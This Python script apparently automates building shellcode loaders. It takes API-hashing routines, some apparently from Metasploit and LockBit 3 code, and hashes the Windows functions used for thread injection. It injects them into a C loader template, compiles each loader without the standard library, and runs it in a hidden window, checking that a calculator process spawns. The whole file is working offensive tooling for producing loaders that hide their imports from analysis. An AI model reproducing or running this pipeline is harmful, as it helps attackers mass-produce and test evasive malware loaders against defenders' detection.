import os
import subprocess
import importlib.util
import re
import sys
import time

# CONFIGURATION
INPUT_DIR = "./py-to-c-algos-gemini"
OUTPUT_DIR = "./fully-working-templates"
TEMPLATE_FILE = "loader_template.c"

# APIs needed for Thread Injection
TARGET_APIS = [
    "VirtualAlloc", 
    "VirtualProtect", 
    "CreateThread", 
    "WaitForSingleObject"
]

def load_python_module(filepath):
    spec = importlib.util.spec_from_file_location("algo_mod", filepath)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

def clean_c_code(c_code):
    """Removes main() to prevent linker collisions."""
    return re.sub(r'int\s+main\s*\(.*?\)\s*\{.*?\}', '', c_code, flags=re.DOTALL)

def get_calc_count():
    """Returns total count of Calculator processes (Classic + Modern UWP)."""
    count = 0
    # 1. Check for Classic 'calc.exe'
    try:
        output = subprocess.check_output('tasklist /FI "IMAGENAME eq calc.exe"', 
                                         shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        if "No tasks" not in output:
            count += output.lower().count("calc.exe")
    except: pass

    # 2. Check for Modern 'CalculatorApp.exe' (Windows 10/11)
    try:
        output = subprocess.check_output('tasklist /FI "IMAGENAME eq CalculatorApp.exe"', 
                                         shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        if "No tasks" not in output:
            count += output.lower().count("calculatorapp.exe")
    except: pass
    
    return count

def kill_all_calcs():
    """Forcefully kills all types of calculator instances."""
    # Kill classic
    subprocess.run('taskkill /F /IM calc.exe', shell=True, 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Kill modern UWP
    subprocess.run('taskkill /F /IM CalculatorApp.exe', shell=True, 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def verify_execution(exe_path):
    # 1. Hide the loader window
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    # 2. Snapshot
    initial_calcs = get_calc_count()
    
    # 3. Launch Loader (Hidden)
    try:
        loader_proc = subprocess.Popen([exe_path], startupinfo=si)
    except Exception as e:
        print(f"    [-] Launch Error: {e}")
        return False

    # 4. Polling Loop (Max wait: 3 seconds)
    start_time = time.time()
    success = False

    while (time.time() - start_time) < 3.0:
        current_calcs = get_calc_count()
        
        if current_calcs > initial_calcs:
            success = True
            break # Found it!
        
        time.sleep(0.1) # Check again rapidly

    # 5. Cleanup
    if loader_proc.poll() is None:
        loader_proc.terminate()
    
    if success:
        print("    [+] VERIFIED: Calculator spawned.")
        kill_all_calcs() # Immediate cleanup
    else:
        print("    [-] FAILED: Timeout (Calculator did not appear).")

    return success

def run_pipeline():
    if not os.path.exists(OUTPUT_DIR): os.makedirs(OUTPUT_DIR)
    if not os.path.exists(INPUT_DIR):
        print(f"[!] Input directory '{INPUT_DIR}' not found.")
        return

    # Clear any leftover calcs before starting
    kill_all_calcs()

    algo_folders = [f for f in os.listdir(INPUT_DIR) if os.path.isdir(os.path.join(INPUT_DIR, f))]
    print(f"[*] Found {len(algo_folders)} algorithms. Starting Batch...\n")

    verified_count = 0

    for algo_name in algo_folders:
        folder_path = os.path.join(INPUT_DIR, algo_name)
        c_file = os.path.join(folder_path, f"{algo_name}.c")
        py_file = os.path.join(folder_path, f"{algo_name}.py")

        if not os.path.exists(c_file) or not os.path.exists(py_file):
            continue

        print(f"[*] Processing: {algo_name}")

        try:
            # --- Load & Hash ---
            py_mod = load_python_module(py_file)
            hash_func = None
            
            if hasattr(py_mod, 'hash'): hash_func = py_mod.hash
            else:
                import inspect
                for name, obj in inspect.getmembers(py_mod):
                    if inspect.isfunction(obj) and name not in ["ror", "rol"]:
                        hash_func = obj
                        break
            
            if not hash_func:
                print(f"    [!] Skipped: No hash function.")
                continue

            # --- 2. Calculate Hashes ---
            hashes = {}
            
            if algo_name == "metasploit":
                # Metasploit Context
                for api in TARGET_APIS:
                    input_str = b"KERNEL32.DLL\x00\x00\x00" + api.encode()
                    try: val = hash_func(input_str)
                    except: val = hash_func(input_str.decode('latin-1'))
                    if hasattr(val, 'value'): val = val.value
                    hashes[api] = int(val) & 0xFFFFFFFF
                    
            elif algo_name == "lockbit3_C8B32494_s0":
                # [NEW] Lockbit3 Context
                # Format: kernel32.dll + API Name (e.g. kernel32.dllVirtualAlloc)
                for api in TARGET_APIS:
                    input_str = b"kernel32.dll" + api.encode()
                    try: val = hash_func(input_str)
                    except: val = hash_func(input_str.decode('latin-1'))
                    if hasattr(val, 'value'): val = val.value
                    hashes[api] = int(val) & 0xFFFFFFFF
                    
            else:
                # Standard Behavior
                for api in TARGET_APIS:
                    try: val = hash_func(api.encode())
                    except: val = hash_func(api)
                    if hasattr(val, 'value'): val = val.value
                    hashes[api] = int(val) & 0xFFFFFFFF

            # --- Inject ---
            with open(c_file, "r") as f: c_algo_clean = clean_c_code(f.read())
            with open(TEMPLATE_FILE, "r") as f: template = f.read()

            final_code = template.replace("// {{ALGORITHM_INJECTION}}", c_algo_clean)
            for api in TARGET_APIS:
                final_code = final_code.replace(f"{{{{HASH_{api}}}}}", f"0x{hashes[api]:X}")

            # --- Save ---
            algo_out_dir = os.path.join(OUTPUT_DIR, algo_name)
            if not os.path.exists(algo_out_dir): os.makedirs(algo_out_dir)
            
            final_c_path = os.path.join(algo_out_dir, f"{algo_name}_loader.c")
            exe_path = os.path.join(algo_out_dir, f"{algo_name}_loader.exe")

            with open(final_c_path, "w") as f: f.write(final_code)
            
            # --- Compile ---
            cmd = [
                "gcc", final_c_path, "-o", exe_path, 
                "-m64", 
                "-nostdlib",         
                "-nostartfiles", 
                "-Wl,-e,EntryPoint", 
                "-lkernel32"         
            ]
            
            try:
                subprocess.run(cmd, check=True, capture_output=True)
            except subprocess.CalledProcessError as e:
                print(f"    [!] Compile Failed: {e.stderr.decode()}")
                continue
            
            # --- Verify ---
            if verify_execution(exe_path):
                verified_count += 1

        except Exception as e:
            print(f"    [!] Error: {e}")

    print(f"\n[*] Batch Completed. Success Rate: {verified_count}/{len(algo_folders)}")

if __name__ == "__main__":
    run_pipeline()